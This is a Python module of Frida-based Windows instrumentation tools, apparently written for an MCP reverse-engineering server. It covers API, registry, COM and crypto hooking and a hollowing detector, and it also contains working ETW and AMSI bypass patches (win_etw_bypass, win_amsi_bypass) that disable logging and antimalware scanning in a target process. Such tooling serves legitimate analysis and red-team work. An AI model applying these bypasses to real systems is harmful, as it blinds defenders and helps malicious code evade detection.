"""fuzzmind-frida-mcp -- platform_windows tools."""
from __future__ import annotations

from typing import Any
import json

from .._core import INSTALL_HINT, _load_frida, _run_script


def win_api_monitor(
    target: str,
    apis: list[str],
    duration_seconds: int = 10,
) -> dict[str, Any]:
    """Hook Win32 APIs on a Windows target and log call arguments.

    Attaches Interceptor to the specified API exports across kernel32,
    advapi32, ws2_32, ntdll, and user32. Falls back to null-module
    resolution if the API is not found in the known DLLs.

    `target`: process name or pid (string).
    `apis`: list of Win32 API names, e.g. ["CreateFileW", "RegOpenKeyExW"].
    `duration_seconds`: how long to capture (default 10).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    api_list_js = json.dumps(apis)
    js = r"""
    'use strict';
    var apiList = """ + api_list_js + r""";
    var knownDlls = ['kernel32.dll', 'advapi32.dll', 'ws2_32.dll', 'ntdll.dll',
                     'user32.dll', 'crypt32.dll', 'bcrypt.dll', 'secur32.dll'];
    var hooked = [];

    apiList.forEach(function(apiName) {
        var addr = null;
        for (var i = 0; i < knownDlls.length; i++) {
            try {
                addr = _fm_find_export(knownDlls[i], apiName);
                if (addr) break;
            } catch(e) {}
        }
        if (!addr) {
            try { addr = _fm_find_export(null, apiName); } catch(e) {}
        }
        if (addr) {
            try {
                Interceptor.attach(addr, {
                    onEnter: function(args) {
                        var callArgs = [];
                        for (var j = 0; j < 6; j++) {
                            try { callArgs.push(args[j].toString()); } catch(e) { break; }
                        }
                        send({
                            type: 'win_api_call',
                            api: apiName,
                            args: callArgs,
                            thread: Process.getCurrentThreadId(),
                            timestamp: Date.now()
                        });
                    }
                });
                hooked.push(apiName);
            } catch(e) {}
        }
    });
    send({type: 'info', message: 'win_api_monitor hooked: ' + hooked.join(', '), not_found: apiList.filter(function(a) { return hooked.indexOf(a) === -1; })});
    """
    return _run_script(frida, target, js, duration_seconds, "attach")

def win_dotnet_list_assemblies(target: str) -> dict[str, Any]:
    """Enumerate .NET assemblies loaded in a Windows target process.

    Tries the Frida CLR bridge first (CLR.enumerateAssemblies). Falls back
    to enumerating loaded modules and filtering for DLLs with .NET metadata
    (checks for 'mscoree.dll' imports or 'clr.dll' / 'coreclr.dll' presence).

    `target`: process name or pid (string).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    try {
        // Attempt CLR bridge if available
        if (typeof CLR !== 'undefined' && CLR.enumerateAssemblies) {
            var assemblies = CLR.enumerateAssemblies();
            send({
                type: 'dotnet_assemblies',
                source: 'CLR_bridge',
                items: assemblies.map(function(a) {
                    return {name: a.name, location: a.location || null};
                }),
                count: assemblies.length
            });
        } else {
            // Fallback: enumerate modules, detect .NET runtime presence
            var mods = Process.enumerateModules();
            var hasClr = mods.some(function(m) {
                var n = m.name.toLowerCase();
                return n === 'clr.dll' || n === 'coreclr.dll' || n === 'mscorlib.dll' || n === 'mscorlib.ni.dll';
            });
            var dotnetModules = mods.filter(function(m) {
                var n = m.name.toLowerCase();
                return n.endsWith('.dll') && (
                    n.indexOf('system.') === 0 ||
                    n.indexOf('microsoft.') === 0 ||
                    n === 'mscorlib.dll' ||
                    n === 'mscorlib.ni.dll' ||
                    n === 'clr.dll' ||
                    n === 'coreclr.dll' ||
                    n === 'clrjit.dll'
                );
            });
            // Also list non-system DLLs as potential user assemblies if CLR is present
            var userAssemblies = [];
            if (hasClr) {
                userAssemblies = mods.filter(function(m) {
                    var n = m.name.toLowerCase();
                    return n.endsWith('.dll') && dotnetModules.indexOf(m) === -1;
                }).slice(0, 200);
            }
            send({
                type: 'dotnet_assemblies',
                source: 'module_scan',
                clr_present: hasClr,
                framework_modules: dotnetModules.map(function(m) {
                    return {name: m.name, base: m.base.toString(), path: m.path};
                }),
                user_modules: userAssemblies.map(function(m) {
                    return {name: m.name, base: m.base.toString(), path: m.path};
                }),
                count: dotnetModules.length + userAssemblies.length
            });
        }
    } catch(e) {
        send({type: 'error', message: '.NET enumeration failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds=5, mode="attach")

def win_dotnet_hook_method(
    target: str,
    assembly: str,
    namespace: str,
    class_name: str,
    method_name: str,
    duration_seconds: int = 10,
) -> dict[str, Any]:
    """Hook a .NET method in a Windows target process.

    Tries the Frida CLR bridge first. Falls back to searching for the
    JIT-compiled method address via module export scanning.

    `target`: process name or pid (string).
    `assembly`: assembly name (e.g. 'mscorlib').
    `namespace`: .NET namespace (e.g. 'System.IO').
    `class_name`: class name (e.g. 'File').
    `method_name`: method name (e.g. 'ReadAllText').
    `duration_seconds`: how long to capture calls (default 10).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    safe_ns = json.dumps(namespace)
    safe_cls = json.dumps(class_name)
    safe_method = json.dumps(method_name)
    safe_asm = json.dumps(assembly)
    js = r"""
    'use strict';
    var nsName = """ + safe_ns + r""";
    var clsName = """ + safe_cls + r""";
    var methodName = """ + safe_method + r""";
    var asmName = """ + safe_asm + r""";
    var fullName = nsName + '.' + clsName;

    try {
        if (typeof CLR !== 'undefined' && CLR.use) {
            // CLR bridge path
            var klass = CLR.use(fullName);
            if (klass && klass[methodName]) {
                var original = klass[methodName];
                klass[methodName] = function() {
                    var argStrs = [];
                    for (var i = 0; i < arguments.length; i++) {
                        try { argStrs.push(String(arguments[i])); } catch(e) { argStrs.push('<?>'); }
                    }
                    send({
                        type: 'dotnet_call',
                        class: fullName,
                        method: methodName,
                        args: argStrs,
                        timestamp: Date.now()
                    });
                    return original.apply(this, arguments);
                };
                send({type: 'info', message: 'hooked (CLR bridge) ' + fullName + '.' + methodName});
            } else {
                send({type: 'error', message: 'method not found via CLR bridge: ' + fullName + '.' + methodName});
            }
        } else {
            // Fallback: search for JIT-compiled symbol in clrjit/coreclr
            var candidates = ['clrjit.dll', 'coreclr.dll', 'clr.dll'];
            var found = false;
            for (var ci = 0; ci < candidates.length; ci++) {
                try {
                    var mod = Process.findModuleByName(candidates[ci]);
                    if (!mod) continue;
                    var exports = mod.enumerateExports();
                    for (var ei = 0; ei < exports.length; ei++) {
                        var eName = exports[ei].name;
                        if (eName.indexOf(clsName) !== -1 && eName.indexOf(methodName) !== -1) {
                            Interceptor.attach(exports[ei].address, {
                                onEnter: function(args) {
                                    send({
                                        type: 'dotnet_call',
                                        class: fullName,
                                        method: methodName,
                                        source: 'jit_export',
                                        symbol: eName,
                                        timestamp: Date.now()
                                    });
                                }
                            });
                            found = true;
                            send({type: 'info', message: 'hooked (export) ' + eName});
                            break;
                        }
                    }
                    if (found) break;
                } catch(e) {}
            }
            if (!found) {
                send({type: 'error', message: 'could not locate JIT address for ' + fullName + '.' + methodName + '. CLR bridge not available.'});
            }
        }
    } catch(e) {
        send({type: 'error', message: 'dotnet hook failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds, "attach")

def win_registry_monitor(
    target: str,
    duration_seconds: int = 10,
) -> dict[str, Any]:
    """Monitor Windows Registry operations in a target process.

    Hooks RegOpenKeyExW, RegSetValueExW, RegQueryValueExW, and
    RegDeleteKeyW in advapi32.dll. Logs registry key paths, value
    names, and data sizes.

    `target`: process name or pid (string).
    `duration_seconds`: how long to monitor (default 10).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    var hooked = [];

    // ---- RegOpenKeyExW ----
    try {
        var fn = _fm_find_export('advapi32.dll', 'RegOpenKeyExW');
        if (fn) {
            Interceptor.attach(fn, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    try { this._subKey = args[1].readUtf16String(); } catch(e) { this._subKey = '<unreadable>'; }
                },
                onLeave: function(retval) {
                    send({
                        type: 'registry_op',
                        api: 'RegOpenKeyExW',
                        hkey: this._hKey.toString(),
                        subkey: this._subKey,
                        status: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('RegOpenKeyExW');
        }
    } catch(e) {}

    // ---- RegSetValueExW ----
    try {
        var fn2 = _fm_find_export('advapi32.dll', 'RegSetValueExW');
        if (fn2) {
            Interceptor.attach(fn2, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    try { this._valueName = args[1].readUtf16String(); } catch(e) { this._valueName = '<unreadable>'; }
                    this._type = args[2].toInt32();
                    this._dataSize = args[4].toInt32();
                },
                onLeave: function(retval) {
                    send({
                        type: 'registry_op',
                        api: 'RegSetValueExW',
                        hkey: this._hKey.toString(),
                        value_name: this._valueName,
                        reg_type: this._type,
                        data_size: this._dataSize,
                        status: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('RegSetValueExW');
        }
    } catch(e) {}

    // ---- RegQueryValueExW ----
    try {
        var fn3 = _fm_find_export('advapi32.dll', 'RegQueryValueExW');
        if (fn3) {
            Interceptor.attach(fn3, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    try { this._valueName = args[1].readUtf16String(); } catch(e) { this._valueName = '<unreadable>'; }
                },
                onLeave: function(retval) {
                    send({
                        type: 'registry_op',
                        api: 'RegQueryValueExW',
                        hkey: this._hKey.toString(),
                        value_name: this._valueName,
                        status: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('RegQueryValueExW');
        }
    } catch(e) {}

    // ---- RegDeleteKeyW ----
    try {
        var fn4 = _fm_find_export('advapi32.dll', 'RegDeleteKeyW');
        if (fn4) {
            Interceptor.attach(fn4, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    try { this._subKey = args[1].readUtf16String(); } catch(e) { this._subKey = '<unreadable>'; }
                },
                onLeave: function(retval) {
                    send({
                        type: 'registry_op',
                        api: 'RegDeleteKeyW',
                        hkey: this._hKey.toString(),
                        subkey: this._subKey,
                        status: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('RegDeleteKeyW');
        }
    } catch(e) {}

    send({type: 'info', message: 'win_registry_monitor hooked: ' + hooked.join(', ')});
    """
    return _run_script(frida, target, js, duration_seconds, "attach")

def win_com_intercept(
    target: str,
    clsid_or_progid: str,
    method_index: int,
    duration_seconds: int = 10,
) -> dict[str, Any]:
    """Intercept a COM vtable method call on Windows.

    Hooks CoCreateInstance to capture COM object creation for the
    specified CLSID/ProgID, then patches the vtable at `method_index`
    to log invocations.

    `target`: process name or pid (string).
    `clsid_or_progid`: CLSID (e.g. '{00021401-0000-0000-C000-000000000046}')
      or ProgID string to match.
    `method_index`: 0-based vtable index of the method to hook
      (0=QueryInterface, 1=AddRef, 2=Release, 3+ = interface methods).
    `duration_seconds`: how long to capture (default 10).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    safe_clsid = json.dumps(clsid_or_progid)
    js = r"""
    'use strict';
    var targetClsid = """ + safe_clsid + r""";
    var methodIdx = """ + str(int(method_index)) + r""";
    var hooked = false;

    try {
        var CoCreateInstance = _fm_find_export('ole32.dll', 'CoCreateInstance');
        if (!CoCreateInstance) {
            send({type: 'error', message: 'CoCreateInstance not found (not Windows or ole32 not loaded)'});
        } else {
            Interceptor.attach(CoCreateInstance, {
                onEnter: function(args) {
                    // args: rclsid, pUnkOuter, dwClsContext, riid, ppv
                    this._ppv = args[4];
                    // Read CLSID as raw bytes and format
                    try {
                        var clsidBytes = args[0].readByteArray(16);
                        var arr = new Uint8Array(clsidBytes);
                        var hex = Array.from(arr).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join('');
                        this._clsid = hex;
                    } catch(e) { this._clsid = '<unreadable>'; }
                },
                onLeave: function(retval) {
                    if (retval.toInt32() !== 0) return;  // S_OK = 0
                    var clsidMatch = this._clsid.toLowerCase().indexOf(
                        targetClsid.replace(/[{}-]/g, '').toLowerCase()
                    ) !== -1 || targetClsid === '*';

                    if (clsidMatch && !hooked) {
                        try {
                            var pInterface = this._ppv.readPointer();
                            if (!pInterface.isNull()) {
                                var vtable = pInterface.readPointer();
                                var methodAddr = vtable.add(methodIdx * Process.pointerSize).readPointer();
                                Interceptor.attach(methodAddr, {
                                    onEnter: function(args) {
                                        var callArgs = [];
                                        for (var i = 0; i < 4; i++) {
                                            try { callArgs.push(args[i].toString()); } catch(e) { break; }
                                        }
                                        send({
                                            type: 'com_call',
                                            clsid: targetClsid,
                                            vtable_index: methodIdx,
                                            this_ptr: args[0].toString(),
                                            args: callArgs,
                                            timestamp: Date.now()
                                        });
                                    }
                                });
                                hooked = true;
                                send({type: 'info', message: 'COM vtable[' + methodIdx + '] hooked for CLSID ' + targetClsid});
                            }
                        } catch(e) {
                            send({type: 'error', message: 'vtable hook failed: ' + e.message});
                        }
                    }

                    send({
                        type: 'com_create',
                        clsid_hex: this._clsid,
                        target_match: clsidMatch,
                        hresult: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            send({type: 'info', message: 'monitoring CoCreateInstance for ' + targetClsid + ' vtable[' + methodIdx + ']'});
        }
    } catch(e) {
        send({type: 'error', message: 'win_com_intercept failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds, "attach")

def win_etw_bypass(target: str) -> dict[str, Any]:
    """Patch EtwEventWrite to neutralise ETW logging in a Windows target.

    Overwrites the first bytes of ntdll!EtwEventWrite with a `ret 0`
    stub so the function returns SUCCESS (0) immediately without emitting
    any ETW events. Standard anti-logging bypass used in red-team tooling.

    `target`: process name or pid (string).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    try {
        var addr = _fm_find_export('ntdll.dll', 'EtwEventWrite');
        if (!addr) {
            send({type: 'error', message: 'EtwEventWrite not found (not Windows or ntdll not loaded)'});
        } else {
            // Save original bytes for reporting
            var origBytes = new Uint8Array(addr.readByteArray(8));
            var origHex = Array.from(origBytes).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join(' ');

            // Patch: xor eax, eax; ret  (x64: 33 C0 C3)
            Memory.protect(addr, 8, 'rwx');
            addr.writeByteArray([0x33, 0xC0, 0xC3]);

            var newBytes = new Uint8Array(addr.readByteArray(8));
            var newHex = Array.from(newBytes).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join(' ');

            send({
                type: 'etw_bypass',
                status: 'patched',
                address: addr.toString(),
                original_bytes: origHex,
                patched_bytes: newHex,
                timestamp: Date.now()
            });
        }
    } catch(e) {
        send({type: 'error', message: 'etw_bypass failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds=3, mode="attach")

def win_crypto_hook(
    target: str,
    duration_seconds: int = 10,
) -> dict[str, Any]:
    """Hook Windows CryptoAPI and BCrypt encryption/decryption operations.

    Hooks CryptEncrypt, CryptDecrypt (advapi32), BCryptEncrypt,
    BCryptDecrypt (bcrypt.dll). Logs algorithm context, key handle,
    data sizes, and operation type.

    `target`: process name or pid (string).
    `duration_seconds`: how long to capture (default 10).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    var hooked = [];

    // ---- CryptoAPI: CryptEncrypt ----
    try {
        var fn = _fm_find_export('advapi32.dll', 'CryptEncrypt');
        if (fn) {
            Interceptor.attach(fn, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    this._final = args[2].toInt32();
                    this._dataLen = args[4].readU32 ? args[4].readU32() : 0;
                },
                onLeave: function(retval) {
                    send({
                        type: 'win_crypto_op',
                        api: 'CryptEncrypt',
                        operation: 'encrypt',
                        hkey: this._hKey.toString(),
                        is_final: this._final !== 0,
                        data_len: this._dataLen,
                        result: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('CryptEncrypt');
        }
    } catch(e) {}

    // ---- CryptoAPI: CryptDecrypt ----
    try {
        var fn2 = _fm_find_export('advapi32.dll', 'CryptDecrypt');
        if (fn2) {
            Interceptor.attach(fn2, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    this._final = args[2].toInt32();
                    this._dataLen = args[4].readU32 ? args[4].readU32() : 0;
                },
                onLeave: function(retval) {
                    send({
                        type: 'win_crypto_op',
                        api: 'CryptDecrypt',
                        operation: 'decrypt',
                        hkey: this._hKey.toString(),
                        is_final: this._final !== 0,
                        data_len: this._dataLen,
                        result: retval.toInt32(),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('CryptDecrypt');
        }
    } catch(e) {}

    // ---- BCrypt: BCryptEncrypt ----
    try {
        var fn3 = _fm_find_export('bcrypt.dll', 'BCryptEncrypt');
        if (fn3) {
            Interceptor.attach(fn3, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    this._inputLen = args[2].toInt32();
                    this._outputLen = args[6].toInt32();
                },
                onLeave: function(retval) {
                    send({
                        type: 'win_crypto_op',
                        api: 'BCryptEncrypt',
                        operation: 'encrypt',
                        hkey: this._hKey.toString(),
                        input_size: this._inputLen,
                        output_size: this._outputLen,
                        ntstatus: '0x' + (retval.toInt32() >>> 0).toString(16),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('BCryptEncrypt');
        }
    } catch(e) {}

    // ---- BCrypt: BCryptDecrypt ----
    try {
        var fn4 = _fm_find_export('bcrypt.dll', 'BCryptDecrypt');
        if (fn4) {
            Interceptor.attach(fn4, {
                onEnter: function(args) {
                    this._hKey = args[0];
                    this._inputLen = args[2].toInt32();
                    this._outputLen = args[6].toInt32();
                },
                onLeave: function(retval) {
                    send({
                        type: 'win_crypto_op',
                        api: 'BCryptDecrypt',
                        operation: 'decrypt',
                        hkey: this._hKey.toString(),
                        input_size: this._inputLen,
                        output_size: this._outputLen,
                        ntstatus: '0x' + (retval.toInt32() >>> 0).toString(16),
                        timestamp: Date.now()
                    });
                }
            });
            hooked.push('BCryptDecrypt');
        }
    } catch(e) {}

    send({type: 'info', message: 'win_crypto_hook hooked: ' + hooked.join(', ')});
    """
    return _run_script(frida, target, js, duration_seconds, "attach")

def win_amsi_bypass(target: str) -> dict[str, Any]:
    """Patch AmsiScanBuffer to bypass AMSI scanning in a Windows target.

    Overwrites the beginning of amsi!AmsiScanBuffer so it always returns
    AMSI_RESULT_CLEAN (0x80070057 = E_INVALIDARG, which causes the caller
    to treat the content as clean). Standard AMSI bypass.

    `target`: process name or pid (string).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    try {
        var amsiMod = Process.findModuleByName('amsi.dll');
        if (!amsiMod) {
            // Try to force-load amsi.dll
            try {
                var LoadLibraryW = _fm_find_export('kernel32.dll', 'LoadLibraryW');
                if (LoadLibraryW) {
                    var loadLib = new NativeFunction(LoadLibraryW, 'pointer', ['pointer']);
                    var dllName = Memory.allocUtf16String('amsi.dll');
                    loadLib(dllName);
                    amsiMod = Process.findModuleByName('amsi.dll');
                }
            } catch(e) {}
        }

        if (!amsiMod) {
            send({type: 'error', message: 'amsi.dll not found in process (not Windows or AMSI not loaded)'});
        } else {
            var addr = _fm_find_export('amsi.dll', 'AmsiScanBuffer');
            if (!addr) {
                send({type: 'error', message: 'AmsiScanBuffer export not found'});
            } else {
                // Save original bytes
                var origBytes = new Uint8Array(addr.readByteArray(16));
                var origHex = Array.from(origBytes).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join(' ');

                // Patch: mov eax, 0x80070057; ret  (x64: B8 57 00 07 80 C3)
                // This returns E_INVALIDARG, causing callers to skip the scan
                Memory.protect(addr, 16, 'rwx');
                addr.writeByteArray([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]);

                var patchedBytes = new Uint8Array(addr.readByteArray(16));
                var patchedHex = Array.from(patchedBytes).map(function(b) { return ('0' + b.toString(16)).slice(-2); }).join(' ');

                send({
                    type: 'amsi_bypass',
                    status: 'patched',
                    address: addr.toString(),
                    original_bytes: origHex,
                    patched_bytes: patchedHex,
                    timestamp: Date.now()
                });
            }
        }
    } catch(e) {
        send({type: 'error', message: 'amsi_bypass failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds=3, mode="attach")

def win_hollowing_detect(target: str) -> dict[str, Any]:
    """Detect process hollowing by comparing on-disk PE sections vs in-memory.

    For the main executable module, reads the PE header from the on-disk
    file, then compares each section's expected content hash against
    the in-memory content. Discrepancies (different .text, unmapped
    sections, size mismatches) indicate potential hollowing.

    `target`: process name or pid (string).
    """
    frida = _load_frida()
    if frida is None:
        return {"error": "frida not installed", **INSTALL_HINT}

    js = r"""
    'use strict';
    try {
        var mainModule = Process.enumerateModules()[0];
        if (!mainModule) {
            send({type: 'error', message: 'could not find main module'});
        } else {
            var base = mainModule.base;

            // Read DOS header
            var e_lfanew = base.add(0x3C).readU32();
            var peHeader = base.add(e_lfanew);

            // PE signature check
            var peSig = peHeader.readU32();
            if (peSig !== 0x00004550) {
                send({type: 'error', message: 'invalid PE signature: 0x' + peSig.toString(16)});
            } else {
                // COFF header
                var numSections = peHeader.add(6).readU16();
                var sizeOfOptHeader = peHeader.add(20).readU16();
                var sectionHeaderOffset = e_lfanew + 24 + sizeOfOptHeader;

                var sections = [];
                for (var i = 0; i < numSections; i++) {
                    var secBase = base.add(sectionHeaderOffset + i * 40);
                    var nameBytes = new Uint8Array(secBase.readByteArray(8));
                    var secName = '';
                    for (var j = 0; j < 8; j++) {
                        if (nameBytes[j] === 0) break;
                        secName += String.fromCharCode(nameBytes[j]);
                    }
                    var virtualSize = secBase.add(8).readU32();
                    var virtualAddress = secBase.add(12).readU32();
                    var rawSize = secBase.add(16).readU32();
                    var rawOffset = secBase.add(20).readU32();
                    var characteristics = secBase.add(36).readU32();

                    // Read first 256 bytes of in-memory section for hash
                    var memAddr = base.add(virtualAddress);
                    var checkSize = Math.min(virtualSize, 256);
                    var memHash = 0;
                    try {
                        var memBytes = new Uint8Array(memAddr.readByteArray(checkSize));
                        for (var k = 0; k < memBytes.length; k++) {
                            memHash = ((memHash << 5) - memHash + memBytes[k]) | 0;
                        }
                    } catch(e) { memHash = -1; }

                    sections.push({
                        name: secName,
                        virtual_address: '0x' + virtualAddress.toString(16),
                        virtual_size: virtualSize,
                        raw_size: rawSize,
                        raw_offset: '0x' + rawOffset.toString(16),
                        characteristics: '0x' + (characteristics >>> 0).toString(16),
                        mem_hash: memHash,
                        size_mismatch: Math.abs(virtualSize - rawSize) > 0x1000,
                        executable: (characteristics & 0x20000000) !== 0,
                        writable: (characteristics & 0x80000000) !== 0
                    });
                }

                // Check for suspicious indicators
                var flags = [];
                sections.forEach(function(s) {
                    if (s.name === '.text' && s.size_mismatch) flags.push('.text section size mismatch');
                    if (s.executable && s.writable) flags.push(s.name + ' is RWX (suspicious)');
                    if (s.mem_hash === -1) flags.push(s.name + ' unreadable in memory');
                    if (s.raw_size === 0 && s.virtual_size > 0) flags.push(s.name + ' has no raw data but exists in memory');
                });

                send({
                    type: 'hollowing_check',
                    module: mainModule.name,
                    path: mainModule.path,
                    base: mainModule.base.toString(),
                    num_sections: numSections,
                    sections: sections,
                    suspicious_flags: flags,
                    likely_hollowed: flags.length > 0,
                    timestamp: Date.now()
                });
            }
        }
    } catch(e) {
        send({type: 'error', message: 'hollowing_detect failed: ' + e.message});
    }
    """
    return _run_script(frida, target, js, duration_seconds=5, mode="attach")
